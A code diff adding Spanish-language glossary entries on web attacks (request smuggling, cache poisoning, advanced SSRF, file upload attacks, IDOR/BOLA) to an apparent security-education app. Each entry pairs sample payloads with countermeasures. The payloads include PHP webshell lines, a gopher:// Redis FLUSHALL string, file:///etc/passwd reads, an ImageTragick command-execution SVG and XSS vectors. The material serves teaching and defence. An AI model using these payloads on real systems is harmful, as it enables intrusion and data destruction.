+    related: ["Cross-Site Scripting (XSS)", "DOM-based XSS y sinks modernos", "Prototype Pollution", "Content Security Policy (CSP) moderno"],
+  },
 
   // ── M24 · CSRF, SSRF y File Upload ───────────────────────────────────────
   {
@@ -1887,6 +2617,224 @@ export const DEFINITIONS: ConceptDefinition[] = [
       "Guardar las subidas en storage dedicado fuera del webroot.",
     ],
     related: ["SSRF y metadata cloud", "Injection", "Hardening y CIS Benchmarks"],
+  },
+  {
+    id: 274,
+    module: 24,
+    term: "HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)",
+    short: "Front-end y back-end interpretan el fin de un request diferente. El atacante mete parte de un request en el próximo cliente. Bounty king.",
+    detail:
+      "**HTTP Request Smuggling** (HRS) explota la **desalineación entre proxy front-end y back-end** sobre cuándo termina un request. Investigado por James Kettle (PortSwigger, 2019) — abrió un mundo de bounties de 6 cifras.\n" +
+      "\n**Fundamento:**\nHTTP/1.1 tiene dos formas de indicar el fin del body:\n" +
+      "1. **`Content-Length: N`** — N bytes de body.\n" +
+      "2. **`Transfer-Encoding: chunked`** — chunks de tamaño variable terminados en `0\\r\\n\\r\\n`.\n" +
+      "\nSi ambos headers están presentes, la spec dice que **`Transfer-Encoding` gana**. Pero en la práctica, muchos proxies/servidores discrepan.\n" +
+      "\n**Variante 1: CL.TE — front usa CL, back usa TE**\n" +
+      "```http\nPOST / HTTP/1.1\nHost: victim.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n```\n" +
+      "• Front-end: lee 13 bytes = `0\\r\\n\\r\\nSMUGGLED` → todo un request.\n" +
+      "• Back-end: chunked → lee `0\\r\\n\\r\\n` (fin) → **`SMUGGLED` queda buffered para el próximo request**.\n" +
+      "El próximo user real llega, su request se **prefija con `SMUGGLED`** → attack.\n" +
+      "\n**Variante 2: TE.CL — front usa TE, back usa CL**\n" +
+      "```http\nPOST / HTTP/1.1\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n```\n" +
+      "• Front: chunked → lee todo.\n" +
+      "• Back: CL=3 → lee solo `8\\r\\n`, deja resto para el siguiente request.\n" +
+      "\n**Variante 3: TE.TE — ambos usan TE, pero uno de los dos ignora una variante malformada**\n" +
+      "```\nTransfer-Encoding: chunked\nTransfer-Encoding: xchunked\n```\nUn proxy ignora la segunda, el otro la interpreta como override.\n" +
+      "\n**Variante 4: H2.CL / H2.TE — HTTP/2 downgrade**\n" +
+      "El front habla HTTP/2 con el client, downgrade a HTTP/1.1 al back-end. Los headers HTTP/2 no tienen CL/TE — el proxy los genera. Bugs en la conversión permiten smuggling. **2021 Kettle's talk 'HTTP/2: The Sequel is Always Worse'** cubre esto.\n" +
+      "\n**Impacto:**\n" +
+      "• **Prepend admin actions** al request del siguiente user.\n" +
+      "• **Bypass de WAF** — el WAF ve el request 'limpio', el smuggled va al back-end.\n" +
+      "• **Session hijack** vía cache poisoning.\n" +
+      "• **XSS reflected en response del next user**.\n" +
+      "\n**Detección:**\n" +
+      "• **HTTP Request Smuggler** (Burp extension oficial de PortSwigger) — fuzzing automático.\n" +
+      "• **Response de timeouts** — un smuggling deja el back esperando bytes que no llegan.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **HTTP/2 end-to-end** — sin downgrade.\n" +
+      "• **Rechazar requests ambiguos** — WAF que devuelve 400 si CL + TE están presentes.\n" +
+      "• **Normalizar en el edge** — proxy que reescribe headers antes del back.\n" +
+      "• **Frameworks modernos** (Go net/http, Node.js recientes) ya son estrictos.\n" +
+      "> 💡 **James Kettle's talks (2019, 2021)** son la referencia definitiva. Cobró $10K-$100K en Bug Bounty múltiples veces.\n" +
+      "> ⚠️ HRS es difícil de detectar en runtime — impacta al **siguiente user**, no al atacante que lo dispara.",
+    examples: [
+      "Kettle 2019 (Black Hat): PayPal, Slack, múltiples smuggling con bounties de 5-6 cifras.",
+      "Burp HTTP Request Smuggler extension: fuzz automático.",
+      "Cloudflare 2020: rechaza requests con CL+TE por default.",
+    ],
+    related: ["OWASP Top 10", "HTTP Parameter Pollution (HPP)", "Cache poisoning y web cache deception", "Cross-Site Scripting (XSS)"],
+  },
+  {
+    id: 275,
+    module: 24,
+    term: "Cache poisoning y web cache deception",
+    short: "Envenenar la cache del CDN con response del atacante. Cache deception hace que la victima's data se guarde en un path público.",
+    detail:
+      "**Cache Poisoning** manipula la cache compartida (Varnish, Cloudflare, Akamai) para que **sirva contenido malicioso a otros users**. **Cache Deception** hace que la cache **guarde datos privados** (JWT, cookies) en un path público accessible por atacantes.\n" +
+      "\n**Cache Poisoning — vector clásico (unkeyed input):**\n" +
+      "\nLa cache indexa por **cache key** (típicamente URL + método + a veces algunos headers). Si el server refleja **otros inputs** (headers no incluidos en la key) en la response, atacante los envenena:\n" +
+      "\n```http\nGET /login HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: <script>alert(1)</script>\n// Response del server refleja X-Forwarded-Host en <meta canonical>\n// La cache guarda esta response con key = /login\n// Todo user siguiente en /login recibe el XSS\n```\n\n" +
+      "**Herramientas:**\n" +
+      "• **Param Miner** (Burp) — auto-detecta unkeyed params (headers, query strings) que la app procesa.\n" +
+      "\n**Cache Poisoning DoS:**\n" +
+      "```http\nGET / HTTP/1.1\nX-Original-URL: /nonexistent  // Server 404s\n// Cache key = /, guarda 404, todos ven 404 (DoS)\n```\n\n" +
+      "**Cache Deception — vector clásico:**\n" +
+      "\nLas CDNs cachean por extensión: `.js`, `.css`, `.png` van a cache. Atacante fuerza a la víctima a visitar:\n" +
+      "```\nhttps://victim.com/profile/attacker.css\n```\n" +
+      "El server ignora el `/attacker.css` y sirve el profile del user (con datos privados). El **CDN cachea** por la extensión CSS. El atacante después visita el mismo URL y **lee el cache** con el HTML del profile de la víctima.\n" +
+      "\n**Casos reales:**\n" +
+      "• **PayPal 2017** (Omer Gil) — descubrimiento seminal de web cache deception.\n" +
+      "• **Slack 2020** — cache poisoning por header injection en shared endpoints.\n" +
+      "• **GitHub 2019** — cache poisoning DoS por `X-Forwarded-Scheme`.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Cache key = todos los inputs relevantes** — incluir headers que la app procesa.\n" +
+      "• **Vary header correcto** — `Vary: X-Forwarded-Host` si se refleja.\n" +
+      "• **No cachear responses con data privada** — verificar `Cache-Control: private, no-store` en responses autenticadas.\n" +
+      "• **Normalizar path** — rechazar paths con doble slash, `/../`, extensiones no válidas antes de servir.\n" +
+      "• **Cache key incluye status** — no cachear 4xx/5xx.\n" +
+      "> 💡 **PortSwigger blog 2020 Practical Web Cache Poisoning** es la referencia. Kettle nuevamente.\n" +
+      "> ⚠️ Cache Poisoning tiene **blast radius enorme** — un solo request malicioso puede afectar millones de users.",
+    examples: [
+      "Param Miner Burp: `Guess params` detects unkeyed inputs.",
+      "GitHub 2019 DoS via cache-poisoning $10K bounty.",
+      "PayPal 2017 Omer Gil: cache deception seminal research.",
+    ],
+    related: ["HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)", "Cross-Site Scripting (XSS)", "HTTP Parameter Pollution (HPP)", "Headers de seguridad"],
+  },
+  {
+    id: 276,
+    module: 24,
+    term: "SSRF avanzado: DNS rebinding y protocol smuggling",
+    short: "Cuando IP allowlist se aplica en resolución vs conexión, DNS rebinding evade. gopher://, dict://, file:// abren canales lateral.",
+    detail:
+      "El SSRF básico apunta a IPs privadas (169.254.169.254, 10.0.0.0/8). Las apps modernas **validan** el hostname antes de request. Los vectores avanzados evaden esas defensas.\n" +
+      "\n**Vector 1: DNS Rebinding — TOCTOU en el DNS**\n" +
+      "```\nAtacante controla evil.com.\nquery 1: evil.com → 1.2.3.4 (público, pasa allowlist)\nquery 2 (2s después): evil.com → 169.254.169.254 (metadata AWS)\n```\n" +
+      "1. App valida `hostname === 'evil.com'` y resuelve DNS → obtiene `1.2.3.4`. IP permitida.\n" +
+      "2. Hace HTTP GET a `evil.com`. Vuelve a resolver DNS → esta vez atacante devuelve `169.254.169.254`.\n" +
+      "3. Server contacta metadata AWS y devuelve credenciales.\n" +
+      "\n**Fix**: resolver DNS **una vez** y usar la IP resuelta para el request; verificar IP en cada intento.\n" +
+      "\n**Vector 2: Redirects en el fetch**\n" +
+      "```\nAtacante URL: http://evil.com/redirect\nResponse: 302 Location: http://169.254.169.254/latest/meta-data/\n// Si el fetcher sigue redirects sin re-validar, hits metadata.\n```\n" +
+      "\n**Vector 3: URL parsing discrepancies (Orange Tsai)**\n" +
+      "```\nhttp://foo@evil.com:80@victim.com/\n// Python urllib.parse → host=victim.com\n// Some validators → host=evil.com (accepted)\n// Request hits victim.com internal endpoints\n```\n" +
+      "\n**Vector 4: Protocol smuggling — `gopher://`**\n" +
+      "```\ngopher://redis.internal:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A\n```\n" +
+      "curl con gopher habilitado (default en libcurl) manda bytes raw a puertos internos. Redis, Memcached, SMTP internos son objetivos clásicos.\n" +
+      "\n**Vector 5: `file://`**\n" +
+      "```\nfile:///etc/passwd\nfile:///proc/self/environ\n```\nSi el fetcher acepta `file:`, exfiltración de archivos locales.\n" +
+      "\n**Vector 6: `dict://`, `ldap://`, `sftp://`**\n" +
+      "Todo lo que libcurl soporte por default es superficie.\n" +
+      "\n**Vector 7: IPv6 y encoded IPs**\n" +
+      "```\nhttp://[::ffff:127.0.0.1]/     ← IPv6-mapped IPv4\nhttp://2130706433/               ← 127.0.0.1 en decimal\nhttp://0x7f000001/               ← hex\nhttp://0177.0.0.1/               ← octal\n```\n" +
+      "Bypass filters que solo blacklist `127.0.0.1` string.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Allowlist estricta de destinos** — no blacklist de IPs privadas.\n" +
+      "• **Resolver DNS al principio** y usar la IP resuelta para la conexión.\n" +
+      "• **Verificar IP tras resolución** contra rangos privados/link-local (169.254/16, 10/8, 172.16/12, 192.168/16, 127/8).\n" +
+      "• **Deshabilitar protocolos peligrosos**: en curl, `--proto '=https'`.\n" +
+      "• **No seguir redirects** o revalidar cada uno.\n" +
+      "• **En cloud**: IMDSv2 con hop-limit=1 aunque el SSRF exista.\n" +
+      "• **VPC egress firewall** que solo permite destinos autorizados.\n" +
+      "> 💡 **Orange Tsai's talks** (Black Hat, DEF CON) sobre URL parsing bugs son la referencia.\n" +
+      "> ⚠️ SSRF combinado con **admin endpoints internos** (Jenkins, Consul, K8s API) → RCE.",
+    examples: [
+      "Capital One 2019 explotó SSRF básico a IMDSv1; IMDSv2 lo hubiera cortado.",
+      "GitHub SSRF con Gopher a Redis interno (bounty $10K).",
+      "Herramienta: SSRFmap enumera protocolos, encodings, DNS rebinding.",
+    ],
+    related: ["SSRF y metadata cloud", "IMDSv2 y SSRF a metadata", "XML External Entity (XXE)", "OWASP Top 10"],
+  },
+  {
+    id: 277,
+    module: 24,
+    term: "File upload attacks avanzados",
+    short: "MIME confusion, polyglot files, path traversal en filename, ImageTragick — las defensas ingenuas caen todas.",
+    detail:
+      "Un endpoint de upload es superficie clásica. Las defensas **por MIME** o **por extensión** son insuficientes; polyglots y bypasses son bien conocidos.\n" +
+      "\n**Vector 1: Bypass de extension whitelist**\n" +
+      "```\nshell.php.jpg    // Apache con AddHandler mal configurado ejecuta\nshell.phtml       // Extension menos común pero PHP-executable\nshell.jsp;.jpg    // IIS <7.5: cuelga en el `;`\nshell.pHP         // Case sensitivity bugs\nshell.php%00.jpg  // Null byte truncation (viejo Python)\n```\n\n" +
+      "**Vector 2: MIME confusion**\n" +
+      "```\nContent-Type: image/jpeg\nBody: <?php system($_GET['c']); ?>\n// El server confía en Content-Type; el file no es imagen; cuando se ejecuta como PHP → RCE.\n```\n" +
+      "**Fix**: validar por *magic bytes* (los primeros bytes del file, `FF D8 FF` para JPEG), no MIME declarado.\n" +
+      "\n**Vector 3: Polyglot files — file que es imagen Y PHP**\n" +
+      "```\nCabecera JPEG válida (FFD8 FFE0 ...)\nComentario EXIF con `<?php system($_GET['c']); ?>`\nResto del JPEG\n```\n" +
+      "El file **es** un JPEG válido (magic bytes correctos, se abre en cualquier viewer). Pero si el server lo procesa como PHP → RCE.\n" +
+      "**Herramientas**: **jhead** para inyectar código en EXIF; **PolyGlot** para PDF/JS/HTML polyglots.\n" +
+      "\n**Vector 4: Path traversal en filename**\n" +
+      "```\nfilename=../../../etc/passwd\nfilename=..\\..\\..\\win.ini\n```\n" +
+      "El upload de un file con path traversal en el nombre sobrescribe archivos críticos. Fix: normalizar y usar `basename()`.\n" +
+      "\n**Vector 5: ImageTragick (CVE-2016-3714)**\n" +
+      "**ImageMagick** procesaba `.mvg` y `.svg` con **delegates** que ejecutaban shell commands. Payload:\n" +
+      "```svg\n<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\">\n  <image xlink:href=\"https://example.com/image.jpg|touch /tmp/pwn\"/>\n</svg>\n```\n" +
+      "Cada web app que procesaba avatars con IM era RCE. Múltiples parches; ImageTragick 2 en 2018.\n" +
+      "\n**Vector 6: SVG con `<script>` — stored XSS**\n" +
+      "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>\n```\n" +
+      "Si el server sirve SVG con `Content-Type: image/svg+xml`, el browser ejecuta el script. Fix: sanitizer SVG (DOMPurify con `USE_PROFILES: { svg: true }`), o servir `Content-Type: image/png` forzado.\n" +
+      "\n**Vector 7: ZIP slip (CVE-2018-8825 et al.)**\n" +
+      "Un ZIP con entries `../../../evil` extrae fuera del target dir. Muchas librerías de unzip lo permitían. Fix: validar path resolved dentro del target.\n" +
+      "\n**Vector 8: Archivo comprimido bomb (ZIP/GZIP bomb)**\n" +
+      "42.zip: **42KB → 4.5PB descomprimido**. Antivirus y clamd colapsaban. Fix: límite de descompresión.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Storage fuera del webroot** — el file nunca es ejecutable desde HTTP.\n" +
+      "• **Renombrar el file** a un UUID; no confiar en el filename del user.\n" +
+      "• **Validar magic bytes** con `file` command o libs (`filetype` en Python).\n" +
+      "• **Reprocess images** (thumbnailing via Sharp/Pillow); el output es garantizado no polyglot.\n" +
+      "• **Content-Disposition: attachment** para forzar download en tipos ambiguos.\n" +
+      "• **Antivirus** en el pipeline (ClamAV escaneando cada upload).\n" +
+      "• **Content-Type sniffing off**: `X-Content-Type-Options: nosniff`.\n" +
+      "> 💡 **OWASP File Upload Cheat Sheet** cubre 20+ vectores con contramedidas.\n" +
+      "> ⚠️ ImageMagick sigue en muchas apps — auditá políticas de delegates y actualizá a 7.x con `policy.xml` estricta.",
+    examples: [
+      "ImageTragick 2016: multiple bug bounties $5K-$15K.",
+      "GitHub 2019: SVG XSS en avatar upload (bug bounty).",
+      "Reprocess con Sharp: `sharp(buffer).jpeg({quality:80}).toBuffer()` garantiza JPEG limpio.",
+    ],
+    related: ["OWASP Top 10", "Cross-Site Scripting (XSS)", "SSRF y metadata cloud", "Vulnerable and Outdated Components"],
+  },
+  {
+    id: 278,
+    module: 24,
+    term: "IDOR y BOLA en API modernas",
+    short: "Cambiar un id numérico o UUID en una request obtiene datos de otro user. La API-Top-10 #1 en 2023.",
+    detail:
+      "**IDOR** (*Insecure Direct Object Reference*) sigue siendo el bug **más común** en API pentests, ahora rebranded **BOLA** por OWASP API Security Top 10 (2023).\n" +
+      "\nEl bug es simple: el endpoint recibe un `id` en URL/body y devuelve el objeto sin verificar que pertenezca al caller. Ver definición #247 para conceptos base. Esta entrada profundiza en **variantes modernas de API**.\n" +
+      "\n**Variante 1: BOLA por verb-tampering**\n" +
+      "```\nGET /api/orders/123     → check ownership (safe)\nPUT /api/orders/123     → NO check (dev forgot)\nDELETE /api/orders/123  → NO check\n```\n" +
+      "Auditar cada verbo separadamente.\n" +
+      "\n**Variante 2: BOLA por parameter-tampering**\n" +
+      "```\nPATCH /api/users/me { role: 'admin' }\n// user_id inferido de la sesión, pero el body escala el rol via mass assignment\n```\n" +
+      "\n**Variante 3: BOPLA (Broken Object Property Level Auth)**\n" +
+      "```\nGET /api/users/self\n// Response incluye email, phone, address — todo el user propio.\nGET /api/users/{otro}\n// Response filtra a name + avatar — filtro server-side.\n\nGET /api/users/{otro}?fields=email,phone\n// Si el server obedece 'fields', filtro roto → leak.\n```\n" +
+      "\n**Variante 4: IDs enumerables + rate-limit débil**\n" +
+      "UUIDs v1 son basados en MAC + timestamp — **secuenciales** si se generan seguido. Un atacante enumera millones de IDs por bruteforce.\n" +
+      "\n**Variante 5: Nested resources con auth solo en el padre**\n" +
+      "```\nGET /api/orgs/miorg/projects/{cualquier-project}\n// Server valida `miorg` pero no que `project` pertenezca a `miorg`.\n// Atacante accede a projects de otras orgs.\n```\n" +
+      "\n**Variante 6: BOLA vía batch endpoints**\n" +
+      "```\nPOST /api/batch\n[\n  { \"op\": \"read\", \"resource\": \"/orders/mio\" },  // authorized\n  { \"op\": \"read\", \"resource\": \"/orders/otro\" }  // BOLA if not checked per-op\n]\n```\n" +
+      "\n**Variante 7: BOLA por WebSocket**\n" +
+      "```\nws.send({ subscribe: 'user:123' })\n// Server suscribe sin verificar que el user autenticado sea 123.\n// Atacante escucha eventos privados de cualquier user.\n```\n" +
+      "\n**Herramientas:**\n" +
+      "• **Autorize** (Burp) — envía cada request con cookies de otro user, compara.\n" +
+      "• **AuthMatrix** (Burp) — matrix de tests por endpoint × user.\n" +
+      "• **Escalate** para API discovery.\n" +
+      "• **GraphQL Voyager + query fuzzing** para GraphQL BOLA.\n" +
+      "\n**Contramedidas defensivas:**\n" +
+      "• **Row-level security en DB** — Postgres RLS, Supabase RLS. La DB filtra: `USING (user_id = auth.uid())`.\n" +
+      "• **Middleware de authorization en cada endpoint** — no confiar en 'está authenticated'.\n" +
+      "• **Preferir IDs opacos + auth server-side** — `/api/me/orders/{id}` en vez de `/api/orders/{id}`.\n" +
+      "• **API Gateway policy** que aplica authorization declarativa.\n" +
+      "• **Rate-limit por user** — limita enumeration.\n" +
+      "• **Fields whitelist en response** — nunca deja al user decidir qué campos ver.\n" +
+      "> 💡 **BOLA es el bug más común** en pentests de APIs modernas. Es aburrido pero paga.\n" +
+      "> ⚠️ Muchas orgs auditan por 'endpoint' pero olvidan verbos, batch, nested, WebSocket — todos superficies.",
+    examples: [
+      "Uber 2016 BOLA en cancel-ride ($10K bounty).",
+      "Supabase RLS policy: `CREATE POLICY \"users own\" ON orders USING (user_id = auth.uid())`.",
+      "AuthMatrix Burp: sistematiza tests de authorization por endpoint × user.",
+    ],
+    related: ["BOLA / IDOR y Broken Object Level Auth", "OWASP Top 10", "GraphQL security", "AAA (Autenticación, Autorización, Accounting)"],
   },
 
   // ── M25 · Reconocimiento y OSINT ─────────────────────────────────────────
